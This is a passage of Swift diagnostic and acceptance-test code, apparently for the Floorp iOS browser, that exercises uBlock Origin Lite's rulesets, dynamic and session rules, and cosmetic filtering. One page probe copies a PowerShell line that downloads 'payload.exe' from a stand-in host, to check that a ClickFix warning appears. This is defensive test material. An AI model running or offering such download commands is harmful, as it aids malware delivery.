                throw new Error(response?.error || 'Matched-rules tab was not opened');
            }
            return { tabId: tab.id, windowId: tab.windowId };
            """,
            arguments: ["expectedPrivate": isPrivate],
            contentWorld: .page,
            timeoutNanoseconds: 10_000_000_000
        )
        guard let result = raw as? [String: Any],
              let sourceTabID = (result["tabId"] as? NSNumber)?.intValue,
              (result["windowId"] as? NSNumber)?.intValue != nil else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "uBO Lite matched-rules request did not resolve an active tab ID"
            )
        }

        for _ in 0..<40 {
            if let requestedPrivate, let requestedURLs {
                return FloorpUBOLMatchedRulesWindowAcceptance(
                    sourceTabID: sourceTabID,
                    requestedPrivate: requestedPrivate,
                    urls: requestedURLs
                )
            }
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "uBO Lite did not request the matched-rules window"
        )
    }

    private static func firstWebView(in view: UIView) -> WKWebView? {
        if let webView = view as? WKWebView { return webView }
        return view.subviews.lazy.compactMap { firstWebView(in: $0) }.first
    }

    private func makeBrowserEnvironment() -> FloorpUBOLReleaseBrowserEnvironment {
        let normalConfiguration = WKWebViewConfiguration()
        normalConfiguration.websiteDataStore = websiteDataStore
        normalConfiguration.webExtensionController = controller
        let normalWebView = WKWebView(frame: .zero, configuration: normalConfiguration)
        let normalTab = FloorpUBOLDiagnosticTab(webView: normalWebView)
        let normalWindow = FloorpUBOLDiagnosticWindow(tab: normalTab, isPrivateBrowsing: false)
        normalTab.diagnosticWindow = normalWindow

        let privateConfiguration = WKWebViewConfiguration()
        privateConfiguration.websiteDataStore = .nonPersistent()
        privateConfiguration.webExtensionController = controller
        let privateWebView = WKWebView(frame: .zero, configuration: privateConfiguration)
        let privateTab = FloorpUBOLDiagnosticTab(webView: privateWebView)
        let privateWindow = FloorpUBOLDiagnosticWindow(tab: privateTab, isPrivateBrowsing: true)
        privateTab.diagnosticWindow = privateWindow

        let hostController = UIViewController()
        let hostFrame = CGRect(x: 0, y: 0, width: 390, height: 844)
        hostController.view.frame = hostFrame
        for webView in [normalWebView, privateWebView] {
            webView.frame = hostController.view.bounds
            webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            hostController.view.addSubview(webView)
        }
        privateWebView.isHidden = true

        let hostWindow: UIWindow
        if let windowScene = UIApplication.shared.connectedScenes
            .compactMap({ $0 as? UIWindowScene }).first {
            hostWindow = UIWindow(windowScene: windowScene)
            hostWindow.frame = hostFrame
        } else {
            hostWindow = UIWindow(frame: hostFrame)
        }
        hostWindow.rootViewController = hostController
        hostWindow.makeKeyAndVisible()

        let delegate = FloorpUBOLDiagnosticControllerDelegate(
            windows: [normalWindow, privateWindow],
            focusedWindow: normalWindow
        )
        retainedRuntimeObjects = [
            normalWebView,
            privateWebView,
            normalTab,
            privateTab,
            normalWindow,
            privateWindow,
            hostController,
            hostWindow,
            delegate
        ]
        return FloorpUBOLReleaseBrowserEnvironment(
            normalWebView: normalWebView,
            privateWebView: privateWebView,
            normalTab: normalTab,
            privateTab: privateTab,
            normalWindow: normalWindow,
            privateWindow: privateWindow,
            hostController: hostController,
            hostWindow: hostWindow,
            delegate: delegate
        )
    }

    private func configureOptimalMode() async throws -> Int {
        let procedural = """
        {"selector":"#floorp-procedural-cosmetic","tasks":[["has-text","Sponsored by Floorp"]]}
        """
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const modeManager = await import(browser.runtime.getURL('js/mode-manager.js'));
            await modeManager.setFilteringModeDetails({
                none: new Set(),
                basic: new Set(),
                optimal: new Set([ 'all-urls' ]),
                complete: new Set(),
            });
            const current = await browser.declarativeNetRequest.getEnabledRulesets();
            const enableRulesetIds = requestedRulesets.filter(id => !current.includes(id));
            const disableRulesetIds = current.filter(id => !requestedRulesets.includes(id));
            if ( enableRulesetIds.length || disableRulesetIds.length ) {
                await browser.declarativeNetRequest.updateEnabledRulesets({
                    enableRulesetIds,
                    disableRulesetIds,
                });
            }
            const config = await import(browser.runtime.getURL('js/config.js'));
            config.rulesetConfig.enabledRulesets = requestedRulesets;
            config.rulesetConfig.strictBlockMode = false;
            await config.saveRulesetConfig();
            await browser.runtime.sendMessage({ what: 'setDeveloperMode', state: true });
            const filterManager = await import(browser.runtime.getURL('js/filter-manager.js'));
            await filterManager.removeAllCustomFilters('localhost');
            const scriptingManager = await import(browser.runtime.getURL('js/scripting-manager.js'));
            await filterManager.addCustomFilters('localhost', selectors);
            const rulesetManager = await import(browser.runtime.getURL('js/ruleset-manager.js'));
            await rulesetManager.updateDynamicAndSessionRules();
            await scriptingManager.registerContentScripts();
            return await modeManager.getDefaultFilteringMode();
            """,
            arguments: [
                "requestedRulesets": Self.defaultRulesets,
                "selectors": ["#floorp-custom-cosmetic", procedural]
            ],
            contentWorld: .page
        )
        guard let level = (raw as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "optimal mode setup returned \(String(describing: raw))"
            )
        }
        _ = try await waitForRegisteredContentScripts(
            containing: ["css-specific", "css-user", "ublock-filters.main", "ublock-filters.isolated"]
        )
        return level
    }

    private func applyRulesets(_ identifiers: [String]) async throws -> [String] {
        let result = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const config = await import(browser.runtime.getURL('js/config.js'));
            const rulesets = await import(browser.runtime.getURL('js/ruleset-manager.js'));
            const response = await rulesets.enableRulesets(requested);
            if ( response?.error ) {
                throw new Error(response.error);
            }
            config.rulesetConfig.enabledRulesets = response.enabledRulesets || requested;
            await config.saveRulesetConfig();
            const scripting = await import(browser.runtime.getURL('js/scripting-manager.js'));
            await scripting.registerContentScripts();
            return await browser.declarativeNetRequest.getEnabledRulesets();
            """,
            arguments: ["requested": identifiers],
            contentWorld: .page
        )
        guard let enabled = result as? [String] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "getEnabledRulesets returned \(String(describing: result))"
            )
        }
        return enabled.sorted()
    }

    private func setDefaultFilteringMode(_ level: Int) async throws -> Int {
        let result = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const modeManager = await import(browser.runtime.getURL('js/mode-manager.js'));
            const afterLevel = await modeManager.setDefaultFilteringMode(Number(level));
            const scriptingManager = await import(browser.runtime.getURL('js/scripting-manager.js'));
            await scriptingManager.registerContentScripts();
            return afterLevel;
            """,
            arguments: ["level": level],
            contentWorld: .page
        )
        guard let number = result as? NSNumber else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "setDefaultFilteringMode returned \(String(describing: result))"
            )
        }
        return number.intValue
    }

    private func sendMessage(_ request: [String: Any], in webView: WKWebView? = nil) async throws -> Any? {
        try await (webView ?? extensionWebView).floorpCallAsyncJavaScript(
            "return await browser.runtime.sendMessage(request);",
            arguments: ["request": request],
            contentWorld: .page
        )
    }

    private func registeredContentScriptIDs(in webView: WKWebView? = nil) async throws -> [String] {
        let result = try await (webView ?? extensionWebView).floorpCallAsyncJavaScript(
            """
            const scripts = await browser.scripting.getRegisteredContentScripts();
            return scripts.map(script => script.id);
            """,
            arguments: [:],
            contentWorld: .page
        )
        guard let identifiers = result as? [String] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "getRegisteredContentScripts returned \(String(describing: result))"
            )
        }
        return identifiers.sorted()
    }

    private func registeredContentScriptRegistrations() async throws
        -> [FloorpUBOLContentScriptRegistration] {
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const scripts = await browser.scripting.getRegisteredContentScripts();
            return scripts.map(script => ({
                identifier: script.id,
                javaScriptFiles: script.js || [],
                matches: script.matches || [],
                excludeMatchCount: (script.excludeMatches || []).length,
                excludesLocalhost: (script.excludeMatches || []).some(match =>
                    String(match).includes('localhost')
                ),
                runAt: script.runAt || '',
            }));
            """,
            arguments: [:],
            contentWorld: .page
        )
        guard let dictionaries = raw as? [[String: Any]] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "getRegisteredContentScripts details returned \(String(describing: raw))"
            )
        }
        return try dictionaries.map(FloorpUBOLContentScriptRegistration.init).sorted {
            $0.identifier < $1.identifier
        }
    }

    private func waitForRegisteredContentScripts(
        containing expected: Set<String>,
        in webView: WKWebView? = nil
    ) async throws -> [String] {
        var last = [String]()
        for _ in 0..<30 {
            last = try await registeredContentScriptIDs(in: webView)
            if expected.isSubset(of: Set(last)) {
                return last
            }
            try await Task.sleep(nanoseconds: 250_000_000)
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "registered content scripts \(last) do not contain \(expected.sorted())"
        )
    }

    private func loadAndInspect(_ url: URL, in webView: WKWebView) async throws
        -> FloorpUBOLPageAcceptance {
        let waiter = FloorpUBOLNavigationWaiter()
        try await waiter.load(url, in: webView)
        try await Task.sleep(nanoseconds: 1_000_000_000)
        return try await inspectCurrentPage(in: webView)
    }

    private func inspectCurrentPage(in webView: WKWebView) async throws
        -> FloorpUBOLPageAcceptance {
        let raw = try await webView.floorpCallAsyncJavaScript(
            """
            const hidden = id => {
                const element = document.getElementById(id);
                if (!element) return false;
                const style = getComputedStyle(element);
                return style.display === 'none' || style.visibility === 'hidden' ||
                    Number(style.opacity) === 0;
            };
            const probe = document.createElement('textarea');
            probe.value = 'powershell -NoP Invoke-WebRequest https://example.invalid/payload.exe';
            document.body.append(probe);
            probe.select();
            probe.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
            document.execCommand('copy');
            await new Promise(resolve => setTimeout(resolve, 150));
            const scriptletAlertVisible = document.documentElement.innerText.includes(
                'uBlock Origin blocked a potential ClickFix attack'
            );
            probe.remove();
            return {
                controlScriptExecuted: window.floorpControlScriptExecuted === true,
                defaultBlockedScriptExecuted: window.floorpDefaultBlockedScriptExecuted === true,
                dynamicBlockedScriptExecuted: window.floorpDynamicBlockedScriptExecuted === true,
                sessionBlockedScriptExecuted: window.floorpSessionBlockedScriptExecuted === true,
                customCosmeticHidden: hidden('floorp-custom-cosmetic'),
                proceduralCosmeticHidden: hidden('floorp-procedural-cosmetic'),
                genericCosmeticHidden: hidden('Ad-Container'),
                highlyGenericCosmeticHidden: hidden('floorp-easylist-high-generic'),
                japaneseCosmeticHidden: hidden('floorp-japanese-generic'),
                japaneseHighlyGenericCosmeticHidden: hidden('JP_floorp'),
                stockScriptletExecuted: scriptletAlertVisible
            };
            """,
            arguments: [:],
            contentWorld: .page
        )
        guard let result = raw as? [String: Any] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "page acceptance returned \(String(describing: raw))"
            )
        }
        return try FloorpUBOLPageAcceptance(result)
    }

    private func addDynamicAndSessionRules() async throws -> (dynamic: Int, session: Int) {
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const dynamicID = Number(dynamicRuleID);
            const sessionID = Number(sessionRuleID);
            await browser.declarativeNetRequest.updateDynamicRules({
                removeRuleIds: [dynamicID],
                addRules: [{
                    id: dynamicID,
                    priority: 1,
                    action: { type: 'block' },
                    condition: {
                        urlFilter: '/floorp-dynamic-acceptance.js',
                        resourceTypes: ['script']
                    }
                }]
            });
            await browser.declarativeNetRequest.updateSessionRules({
                removeRuleIds: [sessionID],
                addRules: [{
                    id: sessionID,
                    priority: 1,
                    action: { type: 'block' },
                    condition: {
                        urlFilter: '/floorp-session-acceptance.js',
                        resourceTypes: ['script']
                    }
                }]
            });
            const dynamicRules = await browser.declarativeNetRequest.getDynamicRules();
            const sessionRules = await browser.declarativeNetRequest.getSessionRules();
            return {
                dynamic: dynamicRules.filter(rule => rule.id === dynamicID).length,
                session: sessionRules.filter(rule => rule.id === sessionID).length
            };
            """,
            arguments: [
                "dynamicRuleID": Self.dynamicRuleID,
                "sessionRuleID": Self.sessionRuleID
            ],
            contentWorld: .page
        )
        guard let result = raw as? [String: Any],
              let dynamic = (result["dynamic"] as? NSNumber)?.intValue,
              let session = (result["session"] as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "dynamic/session rule update returned \(String(describing: raw))"
            )
        }
        return (dynamic, session)
    }

    private func acceptanceDNRRuleCounts() async throws -> (dynamic: Int, session: Int) {
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const dynamicID = Number(dynamicRuleID);
            const sessionID = Number(sessionRuleID);
            const dynamicRules = await browser.declarativeNetRequest.getDynamicRules();
            const sessionRules = await browser.declarativeNetRequest.getSessionRules();
            return {
                dynamic: dynamicRules.filter(rule => rule.id === dynamicID).length,
                session: sessionRules.filter(rule => rule.id === sessionID).length,
            };
            """,
            arguments: [
                "dynamicRuleID": Self.dynamicRuleID,
                "sessionRuleID": Self.sessionRuleID
            ],
            contentWorld: .page
        )
        guard let result = raw as? [String: Any],
              let dynamic = (result["dynamic"] as? NSNumber)?.intValue,
              let session = (result["session"] as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "dynamic/session rule count returned \(String(describing: raw))"
            )
        }
        return (dynamic, session)
    }

    private func restoreAcceptanceSessionRule() async throws -> Int {
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const sessionID = Number(sessionRuleID);
            await browser.declarativeNetRequest.updateSessionRules({
                removeRuleIds: [sessionID],
                addRules: [{
                    id: sessionID,
                    priority: 1,
                    action: { type: 'block' },
                    condition: {
                        urlFilter: '/floorp-session-acceptance.js',
                        resourceTypes: ['script'],
                    },
                }],
            });
            const sessionRules = await browser.declarativeNetRequest.getSessionRules();
            return sessionRules.filter(rule => rule.id === sessionID).length;
            """,
            arguments: ["sessionRuleID": Self.sessionRuleID],
            contentWorld: .page
        )
        guard let count = (raw as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "session rule restoration returned \(String(describing: raw))"
            )
        }
        return count
    }

    private func removeAcceptanceDNRRules(in webView: WKWebView? = nil) async throws {
        _ = try await (webView ?? extensionWebView).floorpCallAsyncJavaScript(
            """
            await browser.declarativeNetRequest.updateDynamicRules({
                removeRuleIds: [Number(dynamicRuleID)]
            });
            await browser.declarativeNetRequest.updateSessionRules({
                removeRuleIds: [Number(sessionRuleID)]
            });
            """,
            arguments: [
                "dynamicRuleID": Self.dynamicRuleID,
                "sessionRuleID": Self.sessionRuleID
            ],
            contentWorld: .page
        )
    }

    private func strictBlockStatus() async throws -> FloorpUBOLStrictBlockAcceptance {
        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const configModule = await import(browser.runtime.getURL('js/config.js'));
            const rules = await browser.declarativeNetRequest.getSessionRules();
            const redirectRules = rules.filter(rule =>
                String(rule.action?.redirect?.extensionPath || '').includes('strictblock')
            );
            return {
                configured: configModule.rulesetConfig.strictBlockMode === true,
                redirectRuleCount: redirectRules.length
            };
            """,
            arguments: [:],
            contentWorld: .page
        )
        guard let result = raw as? [String: Any],
              let configured = result["configured"] as? Bool,
              let count = (result["redirectRuleCount"] as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "strict-block status returned \(String(describing: raw))"
            )
        }
        return FloorpUBOLStrictBlockAcceptance(
            configured: configured,
            redirectRuleCount: count,
            upstreamSafariLimitation: true
        )
    }

    private func verifyBackgroundWakePreservesState() async throws
        -> FloorpUBOLBackgroundWakeAcceptance {
        // A WKWebView created from a context's extension-page configuration may
        // keep the MV3 background alive. Retire that page, allow WebKit to suspend
        // the background, and then use the same explicit wake path as Floorp does
        // before navigation. Disable/re-enable itself is intentionally deferred to
        // the next process and is covered by the host lifecycle integration tests.
        retainedExtensionWebView?.stopLoading()
        retainedExtensionWebView?.navigationDelegate = nil
        retainedExtensionWebView = nil
        extensionNavigationWaiter = nil

        try await Task.sleep(nanoseconds: 35_000_000_000)
        try await Self.loadBackgroundContent(in: context)
        let readyPage = try await Self.makeReadyExtensionPage(
            context: context,
            baseURL: context.baseURL
        )
        retainedExtensionWebView = readyPage.webView
        extensionNavigationWaiter = readyPage.waiter
        let resumedWebView = readyPage.webView
        let scripts = try await waitForRegisteredContentScripts(
            containing: ["css-generic-all", "css-user", "jpn-1.main"],
            in: resumedWebView
        )
        let raw = try await resumedWebView.floorpCallAsyncJavaScript(
            """
            const stored = await browser.storage.local.get([
                'filteringModeDetails',
                'rulesetConfig',
                'site.localhost'
            ]);
            const modes = stored.filteringModeDetails || {};
            const mode = Array.isArray(modes.complete) && modes.complete.includes('all-urls')
                ? 3
                : Array.isArray(modes.optimal) && modes.optimal.includes('all-urls')
                    ? 2
                    : Array.isArray(modes.basic) && modes.basic.includes('all-urls')
                        ? 1
                        : 0;
            const enabled = await browser.declarativeNetRequest.getEnabledRulesets();
            const custom = stored['site.localhost'] || [];
            return { mode, enabled, customCount: custom.length };
            """,
            arguments: [:],
            contentWorld: .page
        )
        guard let result = raw as? [String: Any],
              let mode = (result["mode"] as? NSNumber)?.intValue,
              let enabled = result["enabled"] as? [String],
              let customCount = (result["customCount"] as? NSNumber)?.intValue else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "background-wake state returned \(String(describing: raw))"
            )
        }

        return FloorpUBOLBackgroundWakeAcceptance(
            packageVersion: webExtension.version ?? "unknown",
            filteringLevel: mode,
            enabledRulesets: enabled.sorted(),
            customFilterCount: customCount,
            registeredContentScripts: scripts,
            privateAccessPreserved: context.hasAccessToPrivateData
        )
    }

    private static func makeContext(
        webExtension: WKWebExtension,
        identifier: String,
        baseURL: URL,
        privateAccess: Bool
    ) -> WKWebExtensionContext {
        let context = WKWebExtensionContext(for: webExtension)
        context.uniqueIdentifier = identifier
        context.baseURL = baseURL
        context.hasAccessToPrivateData = privateAccess
        context.grantedPermissions = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissions.map {
                ($0, Date.distantFuture)
            }
        )
        context.grantedPermissionMatchPatterns = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissionMatchPatterns.map {
                ($0, Date.distantFuture)
            }
        )
        return context
    }

    private static func loadBackgroundContent(
        in context: WKWebExtensionContext
    ) async throws {
        try await withCheckedThrowingContinuation { continuation in
            let gate = FloorpUBOLBackgroundLoadGate(continuation: continuation)
            context.loadBackgroundContent { error in
                gate.resolve(error)
            }
            Task { @MainActor in
                try? await Task.sleep(nanoseconds: 15_000_000_000)
                gate.timeout()
            }
        }
    }

    private static func makeReadyExtensionPage(
        context: WKWebExtensionContext,
        baseURL: URL
    ) async throws -> (webView: WKWebView, waiter: FloorpUBOLNavigationWaiter) {
        var lastError: (any Error)?
        for attempt in 0..<20 {
            if attempt > 0 {
                try await Task.sleep(nanoseconds: 1_000_000_000)
            }
            guard let configuration = context.webViewConfiguration else {
                lastError = FloorpUBOLDNRDiagnosticError.extensionPageConfigurationUnavailable
                continue
            }
            // This driver intentionally follows WebKit's documented extension-
            // page configuration path exactly. Replacing its user-content
            // controller strips private configuration state on iOS 26.5 and
            // makes the first navigation fail inside Gestures.framework.
            // Production popup isolation has separate host-level coverage.
            let webView = WKWebView(frame: .zero, configuration: configuration)
            let waiter = FloorpUBOLNavigationWaiter()
            do {
                try await waiter.load(
                    baseURL.appendingPathComponent("web_accessible_resources/noop.html"),
                    in: webView
                )
                try await waitUntilBackgroundIsReady(in: webView)
                return (webView, waiter)
            } catch {
                lastError = error
                print(
                    "FLOORP_UBOL_RELEASE_GATE extension-page-attempt=\(attempt + 1) "
                        + "error=\((error as NSError).localizedDescription)"
                )
                webView.stopLoading()
            }
        }
        throw lastError ?? FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "uBO Lite background did not become ready"
        )
    }

    private static func waitUntilBackgroundIsReady(in webView: WKWebView) async throws {
        let result = try await webView.floorpCallAsyncJavaScript(
            """
            const initial = await browser.runtime.sendMessage({ what: 'floorpReadiness' });
            if ( initial?.foregroundReconciliationRequired !== true ) {
                return initial;
            }
            const module = await import(browser.runtime.getURL('js/floorp-reconcile.js'));
            const reconciled = await module.reconcileProtection();
            if ( reconciled?.ready !== true ) {
                return reconciled;
            }
            return await browser.runtime.sendMessage({ what: 'floorpReadiness' });
            """,
            arguments: [:],
            contentWorld: .page,
            timeoutNanoseconds: 5_000_000_000
        )
        guard let readiness = result as? [String: Any],
              readiness["ready"] as? Bool == true,
              readiness["version"] as? String
                == FloorpNativeWebExtensionCatalog.uBlockOriginLite.expectedVersion else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "uBO Lite background readiness returned \(String(describing: result))"
            )
        }
    }

    nonisolated private static func makeServer() throws -> GCDWebServer {
        let server = GCDWebServer()
        server.addHandler(
            forMethod: "GET",
            path: "/",
            request: GCDWebServerRequest.self
        ) { _ in
            GCDWebServerDataResponse(html: """
            <!doctype html>
            <meta charset="utf-8">
            <style>.probe { display: block; width: 20px; height: 20px; }</style>
            <script>
            window.floorpControlScriptExecuted = false;
            window.floorpDefaultBlockedScriptExecuted = false;
            window.floorpDynamicBlockedScriptExecuted = false;
            window.floorpSessionBlockedScriptExecuted = false;
            </script>
            <div id="floorp-custom-cosmetic" class="probe">custom</div>
            <div id="floorp-procedural-cosmetic" class="probe">Sponsored by Floorp</div>
            <div id="Ad-Container" class="probe">generic</div>
            <div id="floorp-easylist-high-generic" class="probe" data-ad-name="floorp-ad">generic high</div>
            <div id="floorp-japanese-generic" class="__isboostReturnAd probe">日本語広告</div>
            <div id="JP_floorp" class="probe" style="display:block">日本語広告 high</div>
            <script src="/floorp-control-acceptance.js"></script>
            <script src="/floorp-default-acceptance.ashx?adid=floorp"></script>
            <script src="/floorp-dynamic-acceptance.js"></script>
            <script src="/floorp-session-acceptance.js"></script>
            """)
        }
        let scripts: [(String, String)] = [
            ("/floorp-control-acceptance.js", "window.floorpControlScriptExecuted = true;"),
            ("/floorp-default-acceptance.ashx", "window.floorpDefaultBlockedScriptExecuted = true;"),
            ("/floorp-dynamic-acceptance.js", "window.floorpDynamicBlockedScriptExecuted = true;"),
            ("/floorp-session-acceptance.js", "window.floorpSessionBlockedScriptExecuted = true;")
        ]
        for (path, source) in scripts {
            server.addHandler(forMethod: "GET", path: path, request: GCDWebServerRequest.self) { _ in
                GCDWebServerDataResponse(
                    data: Data(source.utf8),
                    contentType: "text/javascript"
                )
            }
        }
        guard server.start(withPort: 0, bonjourName: nil) else {
            throw FloorpUBOLDNRDiagnosticError.runtimeServerUnavailable
        }
        return server
    }
}

@MainActor
private final class FloorpUBOLDNRDiagnosticSession {
    private struct Ruleset: Hashable {
        let identifier: String
        let resourcePath: String
        let declaredRuleCount: Int

        static let uBlockFilters = Ruleset(
            identifier: "ublock-filters",
            resourcePath: "rulesets/main/ublock-filters.json",
            declaredRuleCount: 6_505
        )
        static let easyList = Ruleset(
            identifier: "easylist",
            resourcePath: "rulesets/main/easylist.json",
            declaredRuleCount: 50_722
        )
        static let easyPrivacy = Ruleset(
            identifier: "easyprivacy",
            resourcePath: "rulesets/main/easyprivacy.json",
            declaredRuleCount: 55_873
        )
        static let adguardMobile = Ruleset(
            identifier: "adguard-mobile",
            resourcePath: "rulesets/main/adguard-mobile.json",
            declaredRuleCount: 1_528
        )
        static let japanese = Ruleset(
            identifier: "jpn-1",
            resourcePath: "rulesets/main/jpn-1.json",
            declaredRuleCount: 1_906
        )
        static let defaults = [uBlockFilters, easyList, easyPrivacy]
    }

    private static let dynamicRuleLimit = 30_000
    private static let maximumBisectionProbeCount = 48

    private let webExtension: WKWebExtension
    private let context: WKWebExtensionContext
    private let controller: WKWebExtensionController
    private let websiteDataStore: WKWebsiteDataStore
    private let webView: WKWebView
    private let navigationWaiter: FloorpUBOLNavigationWaiter
    private let resourceRoot: URL
    private var remainingBisectionProbeCount = maximumBisectionProbeCount

    init(fixtureURL: URL) async throws {
        self.resourceRoot = fixtureURL
        let webExtension = try await WKWebExtension(resourceBaseURL: fixtureURL)
        guard webExtension.errors.isEmpty else {
            throw FloorpUBOLDNRDiagnosticError.packageErrors(
                webExtension.errors.map(\.localizedDescription)
            )
        }
        self.webExtension = webExtension

        FloorpNativeWebExtensionCatalog.registerBaseURLSchemes()
        let context = WKWebExtensionContext(for: webExtension)
        let diagnosticIdentifier = UUID().uuidString.lowercased()
        context.uniqueIdentifier = "org.ublockorigin.lite.floorp-dnr-diagnostic.\(diagnosticIdentifier)"
        context.baseURL = URL(
            string: "safari-web-extension://ubol-dnr-\(diagnosticIdentifier).floorp.internal/"
        )!
        context.grantedPermissions = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissions.map {
                ($0, Date.distantFuture)
            }
        )
        context.grantedPermissionMatchPatterns = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissionMatchPatterns.map {
                ($0, Date.distantFuture)
            }
        )
        self.context = context

        // Match Floorp's production controller. A controller backed by a
        // non-persistent store produced a false-negative uBOL runtime probe on
        // this simulator even though every static ruleset compiled successfully.
        let websiteDataStore = WKWebsiteDataStore.default()
        self.websiteDataStore = websiteDataStore
        let controllerConfiguration = WKWebExtensionController.Configuration(identifier: UUID())
        controllerConfiguration.defaultWebsiteDataStore = websiteDataStore
        let controller = WKWebExtensionController(configuration: controllerConfiguration)
        self.controller = controller

        defer {
            FloorpWebExtensionTestRuntimeRetainer.retain(
                controller: controller,
                context: context,
                objects: [webExtension, websiteDataStore],
                resourceRoot: fixtureURL
            )
        }
        try controller.load(context)
        guard let webViewConfiguration = context.webViewConfiguration else {
            throw FloorpUBOLDNRDiagnosticError.extensionPageConfigurationUnavailable
        }
        let webView = WKWebView(frame: .zero, configuration: webViewConfiguration)
        self.webView = webView

        let navigationWaiter = FloorpUBOLNavigationWaiter()
        self.navigationWaiter = navigationWaiter
        let diagnosticPageURL = context.baseURL.appendingPathComponent(
            "web_accessible_resources/noop.html"
        )
        try await navigationWaiter.load(diagnosticPageURL, in: webView)
    }

    func close() {
        webView.stopLoading()
        webView.navigationDelegate = nil
        controller.delegate = nil
        FloorpWebExtensionTestRuntimeRetainer.retain(
            controller: controller,
            context: context,
            objects: [webExtension, websiteDataStore, webView, navigationWaiter],
            resourceRoot: resourceRoot
        )
    }

    func run() async throws -> FloorpUBOLDNRDiagnosticReport {
        let initiallyEnabledRulesets = try await enabledStaticRulesets()
        try await clearDynamicRules()
        let baselineEnabledRulesets = try await establishEmptyBaseline()

        let combinations: [[Ruleset]] = [
            [.uBlockFilters],
            [.easyList],
            [.easyPrivacy],
            [.uBlockFilters, .easyList],
            [.uBlockFilters, .easyPrivacy],
            [.easyList, .easyPrivacy],
            Ruleset.defaults,
            Ruleset.defaults + [.japanese],
            Ruleset.defaults + [.adguardMobile],
            Ruleset.defaults + [.adguardMobile, .japanese]
        ]

        var staticProbes = [FloorpUBOLDNRProbeResult]()
        for combination in combinations {
            staticProbes.append(await probeStaticRulesets(combination))
        }

        var bisectionProbes = [FloorpUBOLDNRProbeResult]()
        for (ruleset, probe) in zip(Ruleset.defaults, staticProbes.prefix(3))
            where !probe.succeeded {
            bisectionProbes.append(contentsOf: await bisectFailure(in: ruleset))
        }

        let runtimeVerification: FloorpUBOLDNRRuntimeVerification
        if staticProbes.last?.succeeded == true {
            runtimeVerification = await verifyDefaultRulesAtRuntime()
        } else {
            runtimeVerification = FloorpUBOLDNRRuntimeVerification(
                filter: ".ashx?adid=",
                requestPath: "/floorp-ubol-probe.ashx?adid=floorp",
                controlScriptExecuted: false,
                blockedScriptExecuted: true,
                succeeded: false,
                durationMilliseconds: 0,
                error: FloorpUBOLDNRErrorRecord(
                    domain: "FloorpUBOLDNRDiagnostic",
                    code: 2,
                    message: "Runtime verification was skipped because the complete static set failed."
                )
            )
        }

        try? await clearDynamicRules()
        _ = try? await setStaticRulesets([])

        return FloorpUBOLDNRDiagnosticReport(
            schemaVersion: 1,
            operatingSystem: ProcessInfo.processInfo.operatingSystemVersionString,
            webKitBundleVersion: Bundle(for: WKWebView.self)
                .object(forInfoDictionaryKey: "CFBundleVersion") as? String ?? "unknown",
            packageVersion: webExtension.version ?? "unknown",
            initiallyEnabledRulesets: initiallyEnabledRulesets.sorted(),
            baselineEnabledRulesets: baselineEnabledRulesets.sorted(),
            declaredDefaultRuleCount: Ruleset.defaults.reduce(0) {
                $0 + $1.declaredRuleCount
            },
            staticProbes: staticProbes,
            bisectionProbes: bisectionProbes,
            runtimeVerification: runtimeVerification,
            contextErrors: context.errors.map(FloorpUBOLDNRErrorRecord.init)
        )
    }

    private func verifyDefaultRulesAtRuntime() async -> FloorpUBOLDNRRuntimeVerification {
        let startedAt = Date()
        let filter = ".ashx?adid="
        let requestPath = "/floorp-ubol-probe.ashx?adid=floorp"
        var diagnosticTab: FloorpUBOLDiagnosticTab?
        var diagnosticWindow: FloorpUBOLDiagnosticWindow?

        defer {
            if let diagnosticTab {
                controller.didCloseTab(diagnosticTab, windowIsClosing: true)
            }
            if let diagnosticWindow {
                controller.didCloseWindow(diagnosticWindow)
            }
            controller.delegate = nil
        }

        do {
            let server = try Self.makeRuntimeServer(blockedRequestPath: requestPath)
            defer { server.stop() }

            // Match Floorp startup: enabled contexts are restored before scenes
            // create and register their ordinary browsing WebViews.
            let browsingConfiguration = WKWebViewConfiguration()
            browsingConfiguration.websiteDataStore = websiteDataStore
            browsingConfiguration.webExtensionController = controller
            let browsingWebView = WKWebView(frame: .zero, configuration: browsingConfiguration)
            let tab = FloorpUBOLDiagnosticTab(webView: browsingWebView)
            let window = FloorpUBOLDiagnosticWindow(tab: tab)
            tab.diagnosticWindow = window
            diagnosticTab = tab
            diagnosticWindow = window

            let delegate = FloorpUBOLDiagnosticControllerDelegate(window: window)
            controller.delegate = delegate
            controller.didOpenWindow(window)
            controller.didOpenTab(tab)
            controller.didFocusWindow(window)
